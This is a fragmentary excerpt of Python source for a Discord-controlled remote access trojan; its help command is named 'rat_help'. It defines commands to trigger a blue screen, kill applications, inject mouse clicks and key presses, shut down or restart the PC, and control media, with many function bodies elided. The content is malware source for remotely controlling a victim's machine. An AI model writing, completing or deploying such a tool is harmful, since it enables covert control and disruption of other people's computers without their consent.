...
async def send_embed(ctx, title, description, color=discord.Color.blue(), emoji="ℹ️"):
    embed = discord.Embed(
        title=f"{emoji} {title}",
...
async def blue_screen(ctx):
    try:
        ...
        await send_embed(ctx, "BSOD Failed", "Could not trigger blue screen.", discord.Color.red(), "⚠️")
...
async def close_application(ctx, *, app_name: str):
    try:
        ...
        if closed:
            ...
            await send_embed(ctx, "Close Failed", f"No process found with name containing: **{app_name}**", discord.Color.orange(), "⚠️")
    except Exception as e:
...
async def mouse_click(ctx, button: str = 'left'):
    try:
        ...
        if button == 'left':
            pyautogui.click()
            await send_embed(ctx, "Mouse Click", f"Successfully performed **left** click", discord.Color.blue(), "🖱️")
        elif button == 'right':
            pyautogui.rightClick()
            await send_embed(ctx, "Mouse Click", f"Successfully performed **right** click", discord.Color.blue(), "🖱️")
        elif button == 'middle':
            pyautogui.middleClick()
            await send_embed(ctx, "Mouse Click", f"Successfully performed **middle** click", discord.Color.blue(), "🖱️")
        else:
            await send_embed(ctx, "Invalid Button", "Use: **left**, **right**, or **middle**", discord.Color.orange(), "⚠️")
    except Exception as e:
...
async def press_key(ctx, *, key_combo: str):
    try:
        ...
        await send_embed(ctx, "Keys Pressed", f"Successfully pressed: **{key_combo}**", discord.Color.blue(), "⌨️")
    except Exception as e:
...
async def shutdown_pc(ctx, delay: int = 60):
    try:
        if delay < 10:
            await send_embed(ctx, "Safety Violation", "Delay must be at least **10 seconds** for safety", discord.Color.orange(), "⚠️")
            return

        await send_embed(ctx, "Shutdown Initiated", f"PC will shutdown in **{delay}** seconds", discord.Color.red(), "⏰")

        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Shutting down in **5 seconds**...", discord.Color.dark_red(), "⚠️")
...
async def restart_pc(ctx, delay: int = 60):
    try:
        ...
        await asyncio.sleep(delay - 5)
        await send_embed(ctx, "Final Warning", "Restarting in **5 seconds**...", discord.Color.dark_orange(), "⚠️")
        await asyncio.sleep(5)
...
async def media_play_pause(ctx):
    try:
        ...
        await send_embed(ctx, "Media Control", "Successfully toggled **play/pause**", discord.Color.purple(), "⏯️")
    except Exception as e:
...
async def media_next(ctx):
    try:
        ...
        await send_embed(ctx, "Media Control", "Successfully skipped to **next track**", discord.Color.purple(), "⏭️")
    except Exception as e:
        await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red(), "❌")
...
async def rat_help(ctx):
    ...
    categories = {
        ...
        "⌨️ Mouse & Keyboard": [
            "`click [left|right|middle]` - 🖱️ Mouse click",
            "`press <keys>` - ⌨️ Press keys (ex: ctrl+c)"
        ],
        "🔋 Power Control": [
